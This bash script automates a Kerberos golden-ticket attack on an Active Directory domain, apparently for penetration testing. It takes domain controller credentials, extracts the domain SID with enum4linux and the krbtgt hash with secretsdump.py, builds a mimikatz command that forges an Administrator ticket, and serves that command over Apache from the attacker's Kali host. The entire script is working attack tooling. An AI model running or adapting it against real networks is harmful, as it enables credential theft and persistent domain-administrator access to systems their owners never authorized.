#!/bin/bash

# ============ User Input ============
echo -e "\e[32mEnter the Domain Controller IP:\e[0m"
read DC_IP

echo -e "\e[32mEnter the Domain Name:\e[0m"
read DOMAIN

echo -e "\e[32mEnter the Username:\e[0m"
read USERNAME

echo -e "\e[32mEnter the Password:\e[0m"
read -s PASSWORD

# ============ Settings ============
OUTPUT_FILE="goldenTicket.txt"
WEB_DIR="/var/www/html"

# ============ Extract SID ============
echo "[*] Extracting SID from $DC_IP ..."
SID=$(enum4linux -a $DC_IP | grep -i 'Sid:' | head -n 1 | cut -d ':' -f 2 | tr -d '[:space:]')

if [[ -z "$SID" ]]; then
    echo "[-] Failed to retrieve SID."
    exit 1
fi
echo "[+] SID: $SID"

# ============ Extract krbtgt Hash ============
echo "[*] Extracting krbtgt hash ..."
KRB_HASH=$(python3 secretsdump.py $DOMAIN/$USERNAME:"$PASSWORD"@$DC_IP | grep -i '^Krbtgt' | head -n 1 | cut -d ':' -f 4)

if [[ -z "$KRB_HASH" ]]; then
    echo "[-] Failed to retrieve krbtgt hash."
    exit 1
fi
echo "[+] krbtgt Hash: $KRB_HASH"

# ============ Generate mimikatz command ============
MIMIKATZ_CMD="kerberos::golden /domain:$DOMAIN /sid:$SID /user:Administrator /krbtgt:$KRB_HASH /ptt"

# ============ Save to file ============
echo "[*] Saving output to $OUTPUT_FILE ..."
echo "$MIMIKATZ_CMD" > "$OUTPUT_FILE"

# ============ Move to Web Directory ============
echo "[*] Moving $OUTPUT_FILE to $WEB_DIR ..."
sudo mv "$OUTPUT_FILE" "$WEB_DIR/"

# ============ Start Apache2 ============
echo "[*] Starting apache2 service ..."
sudo systemctl start apache2

echo "[+] Done. Access the file via: http://<your-kali-ip>/$OUTPUT_FILE"
 

